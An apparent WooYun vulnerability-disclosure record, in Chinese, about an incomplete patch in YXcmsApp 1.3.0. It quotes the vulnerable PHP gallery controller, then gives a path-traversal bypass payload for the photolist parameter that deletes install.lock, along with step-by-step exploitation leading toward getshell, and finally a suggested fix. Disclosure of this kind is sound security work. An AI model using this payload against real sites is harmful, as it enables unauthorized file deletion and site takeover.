{"id": 67214, "wybug_id": "wooyun-2015-0132415", "wybug_title": "YXcmsApp1.3.0补丁不当任意文件删除漏洞可getshell", "wybug_corp": "yxcms.net", "wybug_author": "不能忍", "wybug_date": "2015-08-14 15:09", "wybug_open_date": "2015-11-17 15:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-19：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-17：\t细节向公众公开  简要描述： 图集处补丁修复不给力，仍然任意文件删除，可getshell。 详细说明：  WooYun-2015-118193   这个是我之前提交的。漏洞文件：/protected/apps/member/controller/photocontroller.php\tpublic function add()\t{\t\tif(!$this->isPost()){\t\t\t$sortlist=model('sort')->select('','id,name,deep,tplist,path,norder,type');\t\t\tif(empty($sortlist)) $this->error('请先添加图集栏目~',url('sort/photoadd'));\t\t\t$sortlist=re_sort($sortlist);            foreach($sortlist as $vo){            \tif($this->checkConPower($vo['id'])){                    $ct=explode(',',$vo['tplist']);\t\t\t\t    $tpco[$vo['path'].','.$vo['id']]=$ct[1];                    $space = str_repeat('├┈┈┈', $vo['deep']-1);                     $disable=($this->sorttype==$vo['type'])?'':'disabled=\"disabled\" style=\"background-color:#F0F0F0\"';                        $option.= '<option '.$disable.' value=\"'.$vo['path'].','.$vo['id'].'\">'.$space.$vo ['name'].'</option>';                }            }            $this->option=$option;\t\t\t$this->tpc=json_encode($tpco);//默认模板处理            //$places=model('place')->select('','','norder DESC');//定位\t\t\t// $this->places=$places;\t\t\t$this->sortlist=$sortlist;\t\t\t$this->type=$this->sorttype;\t\t\t$this->twidth=config('thumbMaxwidth');\t\t\t$this->theight=config('thumbMaxheight');\t\t\t$this->picpath=__ROOT__.'/upload/photos/';\t\t\t$this->display();\t\t}else{\t\t\tif(empty($_POST['sort'])||empty($_POST['title'])||empty($_POST['tpcontent']))\t\t\t$this->error('请填写完整的信息~');\t\t\t$data=array();\t\t\t//扩展模型开始\t\t\tif (!empty($_POST['tableid'])) {\t\t\t\t$tableid = intval($_POST['tableid']);\t\t\t\t$info = model('extend')->find(\"id='{$tableid}'\",'tableinfo'); //查询表\t\t\t\t$list = model('extend')->select(\"pid='{$tableid}'\",'','id desc'); //查询表中字段\t\t\t\tforeach ($list as $vo) {\t\t\t\t\tif (!empty($vo['tableinfo'])) {\t\t\t\t\t\tif(is_array($_POST['ext_'.$vo['tableinfo']]))\t\t\t\t\t\t\t$fvalue=implode(',',$_POST['ext_'.$vo['tableinfo']]);\t\t\t\t\t\telse\t\t\t\t\t\t    $fvalue=in($_POST['ext_'.$vo['tableinfo']]);\t\t\t\t\t\t$ex_data[$vo['tableinfo']] = empty($fvalue)?$vo['defvalue']:$fvalue; //循环post字段\t\t\t\t\t}\t\t\t\t}\t\t\t\t$extfield=model('extend')->Extin($info['tableinfo'],$ex_data);\t\t\t\t$data['extfield']=$extfield;\t\t\t}\t\t\t//扩展模型结束\t\t\t$data['account']=$this->mesprefix.$this->auth['account'];\t\t\t$data['sort']=$_POST['sort'];\t\t\t$data['exsort']=empty($_POST['exsort'])?'':implode(',',$_POST['exsort']);\t\t\t$data['title']=in($_POST['title']);\t\t\t$data['keywords']=in($_POST['keywords']);\t\t\t$data['picture']=$_POST['picture'];\t\t\t$data['description']=in($_POST['description']);\t\t\t$data['content']=in($_POST['content']);\t\t\t$data['method']='photo/content';\t\t\t$data['tpcontent']=in($_POST['tpcontent']);\t\t\t$data['ispass']=0;\t\t\t$data['recmd']=0;\t\t\t$data['hits']=0;\t\t\t$data['norder']=0;\t\t\t$data['addtime']=time();            // if (empty($data['description'])) {            //      $data['description']=in(substr(deletehtml($_POST['content']), 0, 250)); //自动提取描述               // }            // if(empty($data['keywords'])){                //     $data['keywords']= $this->getkeyword($data['title'].$data['description']); //自动获取中文关键词             //     if(empty($data['keywords'])) $data['keywords']=str_replace(' ',',',$data['description']);//非中文            // }            // if($_POST['iftag']) {            //  \t$iftag = $this->crtags($data['keywords']);            //  \tif(!$iftag) $this->alert('标签生成失败~');            //  }\t\t\tif(!empty($_POST['photolist']))\t\t\t$data['photolist']=implode(',',$_POST['photolist']);  //photolist是用post传过来的。并没有过滤和验证\t\t\tif(!empty($_POST['conlist']))\t\t\t$data['conlist']=implode(',',in($_POST['conlist']));\t\t\tif(model('photo')->insert($data))\t\t\t$this->jump('图集添加成功~',url('photo/index'),'返回列表',url('photo/add'),'继续添加');\t\t\telse $this->error('图集添加失败');\t\t}\t}这个文件下还所有一个del函数：\tpublic function delpic()\t{\t\tif(empty($_POST['picname'])) $this->error('参数错误~');\t\t$picname=trim($_POST['picname']);\t\t$picname=str_replace('../', '', $picname);\t\t$picname=str_replace('./', '', $picname);\t\t$path=$this->uploadpath;\t\t$lasts=strtolower(substr($picname,-3));\t\tif(in_array($lasts,array('gif','jpg','png','bmp'))){\t\t\tif(file_exists($path.$picname)) @unlink($path.$picname);\t\t    else exit('图片不存在~');\t\t    if(file_exists($path.'thumb_'.$picname)) @unlink($path.'thumb_'.$picname);\t\t    else exit('缩略图不存在~');\t\t    echo '原图以及缩略图删除成功~';\t\t}else echo $lasts;\t}这两行：\t\t$picname=str_replace('../', '', $picname);\t\t$picname=str_replace('./', '', $picname);应该就是官方给出的修复补丁，然并卵。参数构造：photolist[]=.....///.....///protected/apps/install/install.lock这样还是能绕过补丁的！利用方法跟之前一样：先注册一个用户，然后添加一个图集，添加的时候抓包。post加上这段：photolist[]=.....///.....///protected/apps/install/install.lock添加成功之后再回到图集列表，删除添加的图集就可以了！后台getshell我就不说了，之前的大牛提交过了！   漏洞证明：  \n\n\n\n\n\n   修复方案：  其实不用$picname=str_replace('./', '', $picname);这样的$picname=str_replace('.', '', $picname);这样就行了!   版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-17 15:10 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}